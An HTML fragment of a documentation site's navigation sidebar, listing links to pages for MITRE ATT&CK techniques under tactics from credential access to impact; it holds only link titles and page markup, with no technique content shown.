<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.html">T1003 - OS Credential Dumping</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1040.html">T1040 - Network Sniffing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1056.001.html">T1056.001 - Keylogging</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1056.002.html">T1056.002 - GUI Input Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1056.003.html">T1056.003 - Web Portal Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1056.004.html">T1056.004 - Credential API Hooking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1056.html">T1056 - Input Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1110.001.html">T1110.001 - Password Guessing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1110.002.html">T1110.002 - Password Cracking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1110.003.html">T1110.003 - Password Spraying</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1110.004.html">T1110.004 - Credential Stuffing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1110.html">T1110 - Brute Force</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1111.html">T1111 - Multi-Factor Authentication Interception</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1187.html">T1187 - Forced Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1212.html">T1212 - Exploitation for Credential Access</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1528.html">T1528 - Steal Application Access Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1539.html">T1539 - Steal Web Session Cookie</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.001.html">T1552.001 - Credentials In Files</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.002.html">T1552.002 - Credentials in Registry</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.003.html">T1552.003 - Bash History</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.004.html">T1552.004 - Private Keys</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.005.html">T1552.005 - Cloud Instance Metadata API</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.006.html">T1552.006 - Group Policy Preferences</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.007.html">T1552.007 - Container API</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.008.html">T1552.008 - Chat Messages</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1552.html">T1552 - Unsecured Credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.001.html">T1555.001 - Keychain</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.002.html">T1555.002 - Securityd Memory</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.003.html">T1555.003 - Credentials from Web Browsers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.004.html">T1555.004 - Windows Credential Manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.005.html">T1555.005 - Password Managers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.006.html">T1555.006 - Cloud Secrets Management Stores</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1555.html">T1555 - Credentials from Password Stores</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.001.html">T1556.001 - Domain Controller Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.002.html">T1556.002 - Password Filter DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.003.html">T1556.003 - Pluggable Authentication Modules</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.004.html">T1556.004 - Network Device Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.005.html">T1556.005 - Reversible Encryption</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.006.html">T1556.006 - Multi-Factor Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.007.html">T1556.007 - Hybrid Identity</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.008.html">T1556.008 - Network Provider DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1556.html">T1556 - Modify Authentication Process</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1557.001.html">T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1557.002.html">T1557.002 - ARP Cache Poisoning</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1557.003.html">T1557.003 - DHCP Spoofing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1557.html">T1557 - Adversary-in-the-Middle</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1558.001.html">T1558.001 - Golden Ticket</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1558.002.html">T1558.002 - Silver Ticket</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1558.003.html">T1558.003 - Kerberoasting</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1558.004.html">T1558.004 - AS-REP Roasting</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1558.html">T1558 - Steal or Forge Kerberos Tickets</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1606.001.html">T1606.001 - Web Cookies</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1606.002.html">T1606.002 - SAML Tokens</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1606.html">T1606 - Forge Web Credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1621.html">T1621 - Multi-Factor Authentication Request Generation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1649.html">T1649 - Steal or Forge Authentication Certificates</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../discovery.html">Discovery</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-7"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1007.html">T1007 - System Service Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1010.html">T1010 - Application Window Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1012.html">T1012 - Query Registry</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1016.001.html">T1016.001 - Internet Connection Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1016.002.html">T1016.002 - Wi-Fi Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1016.html">T1016 - System Network Configuration Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1018.html">T1018 - Remote System Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1033.html">T1033 - System Owner/User Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1040.html">T1040 - Network Sniffing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1046.html">T1046 - Network Service Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1049.html">T1049 - System Network Connections Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1057.html">T1057 - Process Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1069.001.html">T1069.001 - Local Groups</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1069.002.html">T1069.002 - Domain Groups</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1069.003.html">T1069.003 - Cloud Groups</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1069.html">T1069 - Permission Groups Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1082.html">T1082 - System Information Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1083.html">T1083 - File and Directory Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1087.001.html">T1087.001 - Local Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1087.002.html">T1087.002 - Domain Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1087.003.html">T1087.003 - Email Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1087.004.html">T1087.004 - Cloud Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1087.html">T1087 - Account Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1120.html">T1120 - Peripheral Device Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1124.html">T1124 - System Time Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1135.html">T1135 - Network Share Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1201.html">T1201 - Password Policy Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1217.html">T1217 - Browser Information Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1482.html">T1482 - Domain Trust Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1497.001.html">T1497.001 - System Checks</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1497.002.html">T1497.002 - User Activity Based Checks</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1497.003.html">T1497.003 - Time Based Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1497.html">T1497 - Virtualization/Sandbox Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1518.001.html">T1518.001 - Security Software Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1518.html">T1518 - Software Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1526.html">T1526 - Cloud Service Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1538.html">T1538 - Cloud Service Dashboard</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1580.html">T1580 - Cloud Infrastructure Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1613.html">T1613 - Container and Resource Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1614.001.html">T1614.001 - System Language Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1614.html">T1614 - System Location Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1615.html">T1615 - Group Policy Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1619.html">T1619 - Cloud Storage Object Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1622.html">T1622 - Debugger Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1652.html">T1652 - Device Driver Discovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../discovery/T1654.html">T1654 - Log Enumeration</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../lateral-movement.html">Lateral Movement</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-8"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.001.html">T1021.001 - Remote Desktop Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.002.html">T1021.002 - SMB/Windows Admin Shares</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.003.html">T1021.003 - Distributed Component Object Model</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.004.html">T1021.004 - SSH</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.005.html">T1021.005 - VNC</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.006.html">T1021.006 - Windows Remote Management</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.007.html">T1021.007 - Cloud Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.008.html">T1021.008 - Direct Cloud VM Connections</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1021.html">T1021 - Remote Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1072.html">T1072 - Software Deployment Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1080.html">T1080 - Taint Shared Content</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1091.html">T1091 - Replication Through Removable Media</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1210.html">T1210 - Exploitation of Remote Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1534.html">T1534 - Internal Spearphishing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1550.001.html">T1550.001 - Application Access Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1550.002.html">T1550.002 - Pass the Hash</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1550.003.html">T1550.003 - Pass the Ticket</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1550.004.html">T1550.004 - Web Session Cookie</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1550.html">T1550 - Use Alternate Authentication Material</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1563.001.html">T1563.001 - SSH Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1563.002.html">T1563.002 - RDP Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1563.html">T1563 - Remote Service Session Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../lateral-movement/T1570.html">T1570 - Lateral Tool Transfer</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../collection.html">Collection</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-9"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1005.html">T1005 - Data from Local System</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1025.html">T1025 - Data from Removable Media</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1039.html">T1039 - Data from Network Shared Drive</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1056.001.html">T1056.001 - Keylogging</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1056.002.html">T1056.002 - GUI Input Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1056.003.html">T1056.003 - Web Portal Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1056.004.html">T1056.004 - Credential API Hooking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1056.html">T1056 - Input Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1074.001.html">T1074.001 - Local Data Staging</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1074.002.html">T1074.002 - Remote Data Staging</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1074.html">T1074 - Data Staged</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1113.html">T1113 - Screen Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1114.001.html">T1114.001 - Local Email Collection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1114.002.html">T1114.002 - Remote Email Collection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1114.003.html">T1114.003 - Email Forwarding Rule</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1114.html">T1114 - Email Collection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1115.html">T1115 - Clipboard Data</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1119.html">T1119 - Automated Collection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1123.html">T1123 - Audio Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1125.html">T1125 - Video Capture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1185.html">T1185 - Browser Session Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1213.001.html">T1213.001 - Confluence</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1213.002.html">T1213.002 - Sharepoint</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1213.003.html">T1213.003 - Code Repositories</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1213.html">T1213 - Data from Information Repositories</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1530.html">T1530 - Data from Cloud Storage</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1557.001.html">T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1557.002.html">T1557.002 - ARP Cache Poisoning</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1557.003.html">T1557.003 - DHCP Spoofing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1557.html">T1557 - Adversary-in-the-Middle</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1560.001.html">T1560.001 - Archive via Utility</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1560.002.html">T1560.002 - Archive via Library</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1560.003.html">T1560.003 - Archive via Custom Method</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1560.html">T1560 - Archive Collected Data</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1602.001.html">T1602.001 - SNMP (MIB Dump)</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1602.002.html">T1602.002 - Network Device Configuration Dump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../collection/T1602.html">T1602 - Data from Configuration Repository</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../command-and-control.html">Command and Control</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-10"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1001.001.html">T1001.001 - Junk Data</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1001.002.html">T1001.002 - Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1001.003.html">T1001.003 - Protocol Impersonation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1001.html">T1001 - Data Obfuscation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1008.html">T1008 - Fallback Channels</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1071.001.html">T1071.001 - Web Protocols</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1071.002.html">T1071.002 - File Transfer Protocols</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1071.003.html">T1071.003 - Mail Protocols</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1071.004.html">T1071.004 - DNS</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1071.html">T1071 - Application Layer Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1090.001.html">T1090.001 - Internal Proxy</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1090.002.html">T1090.002 - External Proxy</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1090.003.html">T1090.003 - Multi-hop Proxy</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1090.004.html">T1090.004 - Domain Fronting</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1090.html">T1090 - Proxy</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1092.html">T1092 - Communication Through Removable Media</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1095.html">T1095 - Non-Application Layer Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1102.001.html">T1102.001 - Dead Drop Resolver</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1102.002.html">T1102.002 - Bidirectional Communication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1102.003.html">T1102.003 - One-Way Communication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1102.html">T1102 - Web Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1104.html">T1104 - Multi-Stage Channels</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1105.html">T1105 - Ingress Tool Transfer</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1132.001.html">T1132.001 - Standard Encoding</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1132.002.html">T1132.002 - Non-Standard Encoding</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1132.html">T1132 - Data Encoding</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1205.001.html">T1205.001 - Port Knocking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1205.002.html">T1205.002 - Socket Filters</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1205.html">T1205 - Traffic Signaling</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1219.html">T1219 - Remote Access Software</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1568.001.html">T1568.001 - Fast Flux DNS</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1568.002.html">T1568.002 - Domain Generation Algorithms</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1568.003.html">T1568.003 - DNS Calculation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1568.html">T1568 - Dynamic Resolution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1571.html">T1571 - Non-Standard Port</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1572.html">T1572 - Protocol Tunneling</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1573.001.html">T1573.001 - Symmetric Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1573.002.html">T1573.002 - Asymmetric Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1573.html">T1573 - Encrypted Channel</a></li>
<li class="toctree-l2"><a class="reference internal" href="../command-and-control/T1659.html">T1659 - Content Injection</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../exfiltration.html">Exfiltration</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-11"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1011.001.html">T1011.001 - Exfiltration Over Bluetooth</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1011.html">T1011 - Exfiltration Over Other Network Medium</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1020.001.html">T1020.001 - Traffic Duplication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1020.html">T1020 - Automated Exfiltration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1029.html">T1029 - Scheduled Transfer</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1030.html">T1030 - Data Transfer Size Limits</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1041.html">T1041 - Exfiltration Over C2 Channel</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1048.001.html">T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1048.002.html">T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1048.003.html">T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1048.html">T1048 - Exfiltration Over Alternative Protocol</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1052.001.html">T1052.001 - Exfiltration over USB</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1052.html">T1052 - Exfiltration Over Physical Medium</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1537.html">T1537 - Transfer Data to Cloud Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1567.001.html">T1567.001 - Exfiltration to Code Repository</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1567.002.html">T1567.002 - Exfiltration to Cloud Storage</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1567.003.html">T1567.003 - Exfiltration to Text Storage Sites</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1567.004.html">T1567.004 - Exfiltration Over Webhook</a></li>
<li class="toctree-l2"><a class="reference internal" href="../exfiltration/T1567.html">T1567 - Exfiltration Over Web Service</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../impact.html">Impact</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-12"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1485.html">T1485 - Data Destruction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1486.html">T1486 - Data Encrypted for Impact</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1489.html">T1489 - Service Stop</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1490.html">T1490 - Inhibit System Recovery</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1491.001.html">T1491.001 - Internal Defacement</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1491.002.html">T1491.002 - External Defacement</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1491.html">T1491 - Defacement</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1495.html">T1495 - Firmware Corruption</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1496.html">T1496 - Resource Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1498.001.html">T1498.001 - Direct Network Flood</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1498.002.html">T1498.002 - Reflection Amplification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1498.html">T1498 - Network Denial of Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1499.001.html">T1499.001 - OS Exhaustion Flood</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1499.002.html">T1499.002 - Service Exhaustion Flood</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1499.003.html">T1499.003 - Application Exhaustion Flood</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1499.004.html">T1499.004 - Application or System Exploitation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1499.html">T1499 - Endpoint Denial of Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1529.html">T1529 - System Shutdown/Reboot</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1531.html">T1531 - Account Access Removal</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1561.001.html">T1561.001 - Disk Content Wipe</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1561.002.html">T1561.002 - Disk Structure Wipe</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1561.html">T1561 - Disk Wipe</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1565.001.html">T1565.001 - Stored Data Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1565.002.html">T1565.002 - Transmitted Data Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1565.003.html">T1565.003 - Runtime Data Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1565.html">T1565 - Data Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../impact/T1657.html">T1657 - Financial Theft</a></li>
</ul>
</li>
</ul>

    </div>
</nav></div>
    </div>
  
  
  <div class="sidebar-primary-items__end sidebar-primary__section">
  </div>
  
  <div id="rtd-footer-container"></div>


      </div>
      
      <main id="main-content" class="bd-main">
        
        

<div class="sbt-scroll-pixel-helper"></div>

          <div class="bd-content">
            <div class="bd-article-container">
              
              <div class="bd-header-article">
<div class="header-article-items header-article__inner">
  
    <div class="header-article-items__start">
      
        <div class="header-article-item"><label class="sidebar-toggle primary-toggle btn btn-sm" for="__primary" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
